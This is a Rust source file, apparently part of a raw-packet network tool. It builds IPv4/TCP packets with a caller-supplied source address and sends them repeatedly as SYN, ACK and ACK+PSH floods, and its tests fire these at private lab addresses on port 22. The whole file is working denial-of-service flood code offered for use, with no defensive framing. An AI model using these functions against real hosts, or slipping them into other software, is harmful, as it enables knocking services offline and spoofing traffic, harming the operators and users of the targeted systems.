use anyhow::Result;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4;
use pnet::packet::ipv4::{Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{ipv4_checksum, MutableTcpPacket, TcpFlags};
use rand::Rng;
use std::net::Ipv4Addr;
use std::time::Duration;

use crate::layers::layer3_ipv4_send;
use crate::layers::{IPV4_HEADER_SIZE, TCP_HEADER_SIZE};

const TCP_DATA_SIZE: usize = 0;
const TTL: u8 = 64;

pub fn send_syn_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let mut rng = rand::thread_rng();
    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);
    ip_header.set_total_length((IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE) as u16);
    let id = rng.gen();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(TTL);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    let c = ipv4::checksum(&ip_header.to_immutable());
    ip_header.set_checksum(c);

    // tcp header
    let mut tcp_header = MutableTcpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::SYN);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    tcp_header.set_checksum(checksum);
    let timeout = Duration::new(0, 0);

    for _ in 0..max_same_packet {
        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], timeout)?;
    }
    Ok(())
}

pub fn send_ack_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let mut rng = rand::thread_rng();
    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);
    ip_header.set_total_length((IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE) as u16);
    let id = rng.gen();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(TTL);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    let c = ipv4::checksum(&ip_header.to_immutable());
    ip_header.set_checksum(c);

    // tcp header
    let mut tcp_header = MutableTcpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::ACK);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    tcp_header.set_checksum(checksum);
    let timeout = Duration::new(0, 0);

    for _ in 0..max_same_packet {
        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], timeout)?;
    }
    Ok(())
}

pub fn send_ack_psh_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let mut rng = rand::thread_rng();
    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);
    ip_header.set_total_length((IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE) as u16);
    let id = rng.gen();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(TTL);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    let c = ipv4::checksum(&ip_header.to_immutable());
    ip_header.set_checksum(c);

    // tcp header
    let mut tcp_header = MutableTcpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::ACK | TcpFlags::PSH);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    tcp_header.set_checksum(checksum);
    let timeout = Duration::new(0, 0);

    for _ in 0..max_same_packet {
        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], timeout)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_syn_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 128);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 133);
        let src_port = 34567;
        let dst_port = 22;
        let ret = send_syn_flood_packet(src_ipv4, src_port, dst_ipv4, dst_port, 3).unwrap();
        println!("{:?}", ret);
    }
    #[test]
    fn test_ack_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 128);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 133);
        let src_port = 34567;
        let dst_port = 22;
        let ret = send_ack_flood_packet(src_ipv4, src_port, dst_ipv4, dst_port, 3).unwrap();
        println!("{:?}", ret);
    }
}
